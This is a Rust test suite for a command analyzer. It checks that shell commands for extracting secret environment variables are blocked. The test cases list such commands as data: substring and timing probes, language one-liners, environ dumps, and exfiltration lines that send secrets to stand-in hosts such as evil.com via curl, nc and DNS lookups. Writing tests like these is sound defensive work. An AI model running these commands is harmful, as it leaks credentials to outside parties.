//! # Oracle Attack Prevention Tests
//!
//! These tests verify that the analyzer blocks all known oracle attack patterns.
//! Oracle attacks attempt to extract secrets character-by-character through:
//! - Substring extraction (bash ${VAR:N:M})
//! - Conditional probing (if tests)
//! - Text processing tools (cut, awk, sed)
//! - Scripting language one-liners
//!
//! Each test attempts a specific attack and verifies it is BLOCKED.

use phantom_analyzer::{Analyzer, AnalysisResult};

/// Helper to create a strict analyzer with test secrets registered.
fn create_test_analyzer() -> Analyzer {
    let mut analyzer = Analyzer::strict();
    analyzer.add_secret_variable("SECRET");
    analyzer.add_secret_variable("API_KEY");
    analyzer.add_secret_variable("DATABASE_URL");
    analyzer.add_secret_variable("PASSWORD");
    analyzer
}

/// Helper to assert a command is blocked.
fn assert_blocked(result: &AnalysisResult, description: &str) {
    assert!(
        !result.allowed,
        "SECURITY FAILURE: {} was NOT blocked. Action: {:?}, Risk: {}, Patterns: {:?}",
        description,
        result.action,
        result.risk_score,
        result.detected_patterns.iter().map(|p| &p.pattern_id).collect::<Vec<_>>()
    );
}

/// Helper to assert a command is allowed.
fn assert_allowed(result: &AnalysisResult, description: &str) {
    assert!(
        result.allowed,
        "False positive: {} was incorrectly blocked. Reason: {}",
        description,
        result.reason
    );
}

// =============================================================================
// TEST 1: Bash Substring Extraction Attacks
// =============================================================================

/// Attack: Attempt to extract secret character-by-character using bash substring syntax.
///
/// The attacker tries: ${SECRET:0:1}, ${SECRET:1:1}, ${SECRET:2:1}, etc.
/// to extract each character of the secret one at a time.
///
/// Expected: ALL substring extraction attempts are BLOCKED.
#[test]
fn test_bash_substring_extraction_blocked() {
    let analyzer = create_test_analyzer();

    // Test various substring extraction patterns
    let attacks = [
        // Single character extraction at different positions
        ("echo ${SECRET:0:1}", "First character extraction"),
        ("echo ${SECRET:1:1}", "Second character extraction"),
        ("echo ${SECRET:5:1}", "Sixth character extraction"),
        ("echo ${SECRET:0:2}", "First two characters"),
        ("echo ${SECRET:10:5}", "Characters 10-14"),

        // Negative indexing
        ("echo ${SECRET: -1:1}", "Last character via negative index"),
        ("echo ${SECRET: -4:4}", "Last four characters"),

        // Variable offset (dynamic extraction)
        ("echo ${SECRET:$i:1}", "Variable offset extraction"),
        ("for i in $(seq 0 10); do echo ${SECRET:$i:1}; done", "Loop extraction"),

        // Nested extraction
        ("echo ${SECRET:${offset}:1}", "Nested variable offset"),

        // Combined with other commands
        ("result=${SECRET:0:1}; echo $result", "Extraction with assignment"),
        ("export CHAR=${SECRET:0:1}", "Extraction to environment"),
    ];

    for (command, description) in attacks {
        let result = analyzer.analyze(command).expect("Analysis should not error");
        assert_blocked(&result, &format!("Bash substring: {}", description));

        // Verify that at least a SUBSTR pattern is detected for simple cases
        // Note: Nested variable patterns like ${SECRET:${offset}:1} may be caught
        // by multiple patterns or may not have the substring flag parsed correctly,
        // but they should still be blocked
        if !description.contains("Nested") {
            assert!(
                result.detected_patterns.iter().any(|p| p.pattern_id.contains("SUBSTR")),
                "Pattern should be identified as substring extraction for: {}",
                description
            );
        }
    }
}

// =============================================================================
// TEST 2: Conditional Probing Attacks
// =============================================================================

/// Attack: Probe secret value using conditional statements.
///
/// The attacker uses if/test statements to check if the secret equals specific values,
/// leaking information through exit codes or timing.
///
/// Expected: ALL conditional probing attempts are BLOCKED.
#[test]
fn test_conditional_probing_blocked() {
    let analyzer = create_test_analyzer();

    let attacks = [
        // Basic if-then-else probing
        (r#"if [ "$SECRET" = "a" ]; then echo yes; fi"#, "Basic equality test"),
        (r#"if [ "$SECRET" == "password123" ]; then echo found; fi"#, "Full value test"),
        (r#"if [ "${SECRET:0:1}" = "s" ]; then echo yes; fi"#, "Substring in conditional"),

        // Test command variations
        (r#"test "$SECRET" = "test" && echo match"#, "test command"),
        (r#"[ "$SECRET" = "x" ] && echo yes"#, "Bracket test with &&"),
        (r#"[[ "$SECRET" =~ ^a ]]"#, "Regex match test"),

        // Numeric comparisons (could leak length or char codes)
        (r#"if [ "${#SECRET}" -eq 10 ]; then echo len10; fi"#, "Length test"),

        // Case statement probing
        (r#"case $SECRET in a*) echo starts_with_a;; esac"#, "Case pattern match"),
        (r#"case "$API_KEY" in sk_*) echo stripe;; gh_*) echo github;; esac"#, "Multiple case patterns"),

        // Negation tests
        (r#"if [ "$SECRET" != "" ]; then echo exists; fi"#, "Non-empty test"),
        (r#"[ -n "$SECRET" ] && echo not_empty"#, "Non-empty bracket test"),

        // Complex conditionals
        (r#"if [ "$SECRET" = "a" ] || [ "$SECRET" = "b" ]; then exit 0; fi"#, "OR conditional"),
        (r#"if [ "$SECRET" \> "m" ]; then echo second_half; fi"#, "Lexicographic comparison"),
    ];

    for (command, description) in attacks {
        let result = analyzer.analyze(command).expect("Analysis should not error");
        assert_blocked(&result, &format!("Conditional probe: {}", description));
    }
}

// =============================================================================
// TEST 3: Text Processing Tool Extraction
// =============================================================================

/// Attack: Extract characters using cut, awk, sed piped from secret.
///
/// The attacker pipes the secret through text processing tools to extract
/// specific characters or substrings.
///
/// Expected: ALL text processing extraction attempts are BLOCKED.
#[test]
fn test_cut_awk_sed_extraction_blocked() {
    let analyzer = create_test_analyzer();

    let attacks = [
        // cut command attacks
        ("echo $SECRET | cut -c1", "cut first character"),
        ("echo $SECRET | cut -c1-5", "cut first five characters"),
        ("echo $SECRET | cut -c10", "cut tenth character"),
        ("echo \"$SECRET\" | cut -d'_' -f1", "cut with delimiter"),

        // awk attacks
        ("echo $SECRET | awk '{print substr($0,1,1)}'", "awk substr first char"),
        ("echo $SECRET | awk '{print substr($1,5,3)}'", "awk substr middle"),
        ("echo $SECRET | awk -F '' '{print $1}'", "awk field separator char"),
        ("echo $SECRET | awk 'BEGIN{FS=\"\"}{print $1}'", "awk empty FS"),

        // sed attacks
        ("echo $SECRET | sed 's/\\(.)\\{1\\}\\).*/\\1/'", "sed extract first"),
        ("echo $SECRET | sed 's/.\\{5\\}\\(.\\).*/\\1/'", "sed extract sixth"),
        ("echo $SECRET | sed -n 's/^\\(..\\).*/\\1/p'", "sed capture first two"),

        // head/tail on characters
        ("echo $SECRET | head -c1", "head first byte"),
        ("echo $SECRET | tail -c1", "tail last byte"),

        // tr for character manipulation
        ("echo $SECRET | tr -d 'a-z' | head -c1", "tr filter then head"),

        // fold for character iteration
        ("echo $SECRET | fold -w1 | head -1", "fold to lines then head"),

        // grep for character detection
        ("echo $SECRET | grep -o '^.'", "grep first char"),
        ("echo $SECRET | grep -c 'a'", "grep count specific char"),
    ];

    for (command, description) in attacks {
        let result = analyzer.analyze(command).expect("Analysis should not error");
        assert_blocked(&result, &format!("Text tool extraction: {}", description));
    }
}

// =============================================================================
// TEST 4: Python One-liner Attacks
// =============================================================================

/// Attack: Use Python one-liners to access and extract environment variables.
///
/// Python can easily access os.environ and slice strings to extract characters.
///
/// Expected: ALL Python environment access attempts are BLOCKED.
#[test]
fn test_python_oneliner_extraction_blocked() {
    let analyzer = create_test_analyzer();

    let attacks = [
        // Direct environment access
        ("python -c \"import os; print(os.environ['SECRET'][0])\"", "Python first char"),
        ("python3 -c \"import os; print(os.environ['API_KEY'][:4])\"", "Python slice"),
        ("python -c \"import os; print(os.environ.get('SECRET','')[5])\"", "Python get with index"),

        // Character iteration
        ("python -c \"import os; [print(c) for c in os.environ['SECRET']]\"", "Python char iteration"),

        // Encoded output
        ("python -c \"import os,base64; print(base64.b64encode(os.environ['SECRET'].encode()))\"", "Python base64 encode"),

        // File-based access
        ("python script.py -e os.environ", "Python script with env access"),
    ];

    for (command, description) in attacks {
        let result = analyzer.analyze(command).expect("Analysis should not error");
        assert_blocked(&result, &format!("Python attack: {}", description));
    }
}

// =============================================================================
// TEST 5: Node.js One-liner Attacks
// =============================================================================

/// Attack: Use Node.js to access and extract environment variables.
///
/// Expected: ALL Node.js environment access attempts are BLOCKED.
#[test]
fn test_node_oneliner_extraction_blocked() {
    let analyzer = create_test_analyzer();

    let attacks = [
        ("node -e \"console.log(process.env.SECRET[0])\"", "Node first char"),
        ("node -e \"console.log(process.env.SECRET.slice(0,5))\"", "Node slice"),
        ("node --eval \"console.log(process.env.API_KEY.charAt(0))\"", "Node charAt"),
    ];

    for (command, description) in attacks {
        let result = analyzer.analyze(command).expect("Analysis should not error");
        assert_blocked(&result, &format!("Node attack: {}", description));
    }
}

// =============================================================================
// TEST 6: Ruby One-liner Attacks
// =============================================================================

/// Attack: Use Ruby to access and extract environment variables.
///
/// Expected: ALL Ruby environment access attempts are BLOCKED.
#[test]
fn test_ruby_oneliner_extraction_blocked() {
    let analyzer = create_test_analyzer();

    let attacks = [
        ("ruby -e \"puts ENV['SECRET'][0]\"", "Ruby first char"),
        ("ruby -e \"puts ENV['API_KEY'][0,5]\"", "Ruby range slice"),
        ("ruby -e \"ENV['SECRET'].each_char{|c| puts c}\"", "Ruby char iteration"),
    ];

    for (command, description) in attacks {
        let result = analyzer.analyze(command).expect("Analysis should not error");
        assert_blocked(&result, &format!("Ruby attack: {}", description));
    }
}

// =============================================================================
// TEST 7: Perl One-liner Attacks
// =============================================================================

/// Attack: Use Perl to access and extract environment variables.
///
/// Expected: ALL Perl environment access attempts are BLOCKED.
#[test]
fn test_perl_oneliner_extraction_blocked() {
    let analyzer = create_test_analyzer();

    let attacks = [
        ("perl -e 'print substr($ENV{SECRET},0,1)'", "Perl substr"),
        ("perl -e 'print $ENV{API_KEY}=~/^(.)/; print $1'", "Perl regex extract"),
    ];

    for (command, description) in attacks {
        let result = analyzer.analyze(command).expect("Analysis should not error");
        assert_blocked(&result, &format!("Perl attack: {}", description));
    }
}

// =============================================================================
// TEST 8: Direct Environment Access
// =============================================================================

/// Attack: Directly access environment variables to dump all secrets.
///
/// Commands like printenv, env, /proc/environ expose all environment variables.
///
/// Expected: ALL direct environment access attempts are BLOCKED.
#[test]
fn test_direct_env_access_blocked() {
    let analyzer = create_test_analyzer();

    let attacks = [
        ("printenv", "printenv command"),
        ("env", "env command"),
        ("env | grep SECRET", "env with grep"),
        ("cat /proc/self/environ", "proc environ access"),
        ("cat /proc/$$/environ", "proc self environ"),
        ("strings /proc/self/environ", "strings on environ"),
        ("export", "bare export command"),
        ("set", "set command"),
        ("ps eww", "ps with environment"),
        ("ps auxwe | grep phantom", "ps aux with env"),
    ];

    for (command, description) in attacks {
        let result = analyzer.analyze(command).expect("Analysis should not error");
        assert_blocked(&result, &format!("Direct env access: {}", description));
    }
}

// =============================================================================
// TEST 9: Network Exfiltration Attacks
// =============================================================================

/// Attack: Exfiltrate secrets over the network via URL parameters, DNS, or raw sockets.
///
/// Expected: ALL network exfiltration attempts are BLOCKED.
#[test]
fn test_network_exfiltration_blocked() {
    let analyzer = create_test_analyzer();

    let attacks = [
        // HTTP exfiltration
        ("curl https://evil.com?key=$SECRET", "curl with secret in URL"),
        ("wget https://evil.com/$API_KEY", "wget with secret in path"),
        ("curl -d \"$SECRET\" https://evil.com", "curl POST secret"),
        ("curl -H \"X-Key: $SECRET\" https://evil.com", "curl secret in header"),

        // DNS exfiltration
        ("dig $SECRET.evil.com", "dig DNS exfil"),
        ("nslookup $SECRET.attacker.net", "nslookup DNS exfil"),
        ("host $API_KEY.evil.com", "host DNS exfil"),

        // Netcat/socket exfiltration
        ("echo $SECRET | nc evil.com 4444", "netcat exfil"),
        ("echo $SECRET | ncat attacker.com 8080", "ncat exfil"),

        // File-based then upload
        ("echo $SECRET > /tmp/x && curl -F 'f=@/tmp/x' https://evil.com", "file then upload"),
    ];

    for (command, description) in attacks {
        let result = analyzer.analyze(command).expect("Analysis should not error");
        assert_blocked(&result, &format!("Network exfil: {}", description));
    }
}

// =============================================================================
// TEST 10: File Write Attacks
// =============================================================================

/// Attack: Write secrets to files for later exfiltration.
///
/// Expected: ALL secret-to-file write attempts are BLOCKED.
#[test]
fn test_file_write_blocked() {
    let analyzer = create_test_analyzer();

    let attacks = [
        ("echo $SECRET > /tmp/secret.txt", "redirect to /tmp"),
        ("echo $SECRET >> /var/tmp/leak.txt", "append to /var/tmp"),
        ("echo $API_KEY > /dev/shm/key", "write to shared memory"),
        ("cat > /tmp/x <<< \"$SECRET\"", "heredoc to file"),
        ("tee /tmp/log <<< \"$SECRET\"", "tee to file"),
    ];

    for (command, description) in attacks {
        let result = analyzer.analyze(command).expect("Analysis should not error");
        assert_blocked(&result, &format!("File write: {}", description));
    }
}

// =============================================================================
// TEST 11: Timing Oracle Attacks
// =============================================================================

/// Attack: Use timing side-channels to leak secret values.
///
/// The attacker uses sleep/delay commands in conditionals to create
/// measurable timing differences based on secret content.
///
/// Expected: ALL timing oracle attempts are BLOCKED.
#[test]
fn test_timing_oracle_blocked() {
    let analyzer = create_test_analyzer();

    let attacks = [
        // Sleep-based timing
        (r#"if [ "$SECRET" = "a" ]; then sleep 1; fi"#, "sleep in conditional"),
        (r#"[ "${SECRET:0:1}" = "x" ] && sleep 2"#, "sleep on char match"),

        // CPU-intensive operations as timing signals
        (r#"if [ "$SECRET" = "test" ]; then for i in $(seq 1 100000); do :; done; fi"#, "CPU timing"),
    ];

    for (command, description) in attacks {
        let result = analyzer.analyze(command).expect("Analysis should not error");
        assert_blocked(&result, &format!("Timing oracle: {}", description));
    }
}

// =============================================================================
// TEST 12: Encoding/Obfuscation Attacks
// =============================================================================

/// Attack: Encode secrets to bypass sanitization, then decode externally.
///
/// Expected: ALL encoding exfiltration attempts are BLOCKED.
#[test]
fn test_encoding_exfiltration_blocked() {
    let analyzer = create_test_analyzer();

    let attacks = [
        // Base64 encoding
        ("echo $SECRET | base64", "base64 encode"),
        ("base64 <<< \"$SECRET\"", "base64 heredoc"),

        // Hex encoding
        ("echo $SECRET | xxd", "xxd hex dump"),
        ("echo $SECRET | hexdump", "hexdump"),
        ("echo $SECRET | od -A x -t x1", "od hex"),

        // Octal encoding
        ("echo $SECRET | od", "od octal"),

        // URL encoding via tools
        ("echo $SECRET | python -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.stdin.read()))'", "urllib encode"),
    ];

    for (command, description) in attacks {
        let result = analyzer.analyze(command).expect("Analysis should not error");
        assert_blocked(&result, &format!("Encoding exfil: {}", description));
    }
}

// =============================================================================
// TEST 13: Rate Limiting Under Rapid Oracle Probes
// =============================================================================

/// Attack: Attempt 100 rapid oracle probes to brute-force character values.
///
/// Even if individual commands were allowed, rapid probing should trigger
/// rate limiting as it indicates an automated attack.
///
/// Expected: Rate limiting kicks in after configured threshold.
#[test]
fn test_rapid_oracle_rate_limiting() {
    let analyzer = create_test_analyzer();

    // Attempt 100 rapid probes
    let mut blocked_count = 0;
    let probe_count = 100;

    for i in 0..probe_count {
        let command = format!("echo ${{SECRET:{}:1}}", i % 20);
        let result = analyzer.analyze(&command).expect("Analysis should not error");

        // All should be blocked by pattern detection
        if !result.allowed {
            blocked_count += 1;
        }
    }

    // Every single probe must be blocked
    assert_eq!(
        blocked_count, probe_count,
        "All {} oracle probes must be blocked, but only {} were blocked",
        probe_count, blocked_count
    );
}

// =============================================================================
// TEST 14: Legitimate Commands Should Be Allowed
// =============================================================================

/// Verify that legitimate commands using secrets as environment variables are ALLOWED.
///
/// Commands like database connections, git pushes, and cloud CLI operations
/// should work normally when secrets are injected as env vars.
///
/// Expected: Legitimate commands are ALLOWED (no false positives).
#[test]
fn test_legitimate_commands_allowed() {
    let analyzer = create_test_analyzer();

    let legitimate = [
        ("psql $DATABASE_URL -c 'SELECT 1'", "PostgreSQL connection"),
        ("git push origin main", "Git push"),
        ("cargo build --release", "Cargo build"),
        ("npm install", "NPM install"),
        ("docker run -e API_KEY myimage", "Docker with env"),
        ("kubectl apply -f deployment.yaml", "Kubectl apply"),
        ("aws s3 ls", "AWS CLI"),
        ("gh pr create --title 'Fix'", "GitHub CLI"),
    ];

    for (command, description) in legitimate {
        let result = analyzer.analyze(command).expect("Analysis should not error");
        assert_allowed(&result, &format!("Legitimate: {}", description));
    }
}

// =============================================================================
// TEST 15: Complex Pipeline Attacks
// =============================================================================

/// Attack: Use complex multi-stage pipelines to obscure extraction.
///
/// Expected: Complex extraction pipelines are BLOCKED.
#[test]
fn test_complex_pipeline_attacks_blocked() {
    let analyzer = create_test_analyzer();

    let attacks = [
        // Multi-stage extraction
        ("echo $SECRET | tr -d '\\n' | base64 | curl -X POST -d @- https://evil.com", "pipeline extraction"),

        // Command substitution extraction
        ("echo $(echo $SECRET | cut -c1)", "command substitution with cut"),

        // Subshell extraction
        ("(echo $SECRET) | head -c5", "subshell then head"),

        // Process substitution
        ("cat <(echo $SECRET | base64)", "process substitution"),

        // Background job extraction
        ("echo $SECRET > /tmp/x &", "background redirect"),
    ];

    for (command, description) in attacks {
        let result = analyzer.analyze(command).expect("Analysis should not error");
        assert_blocked(&result, &format!("Complex pipeline: {}", description));
    }
}
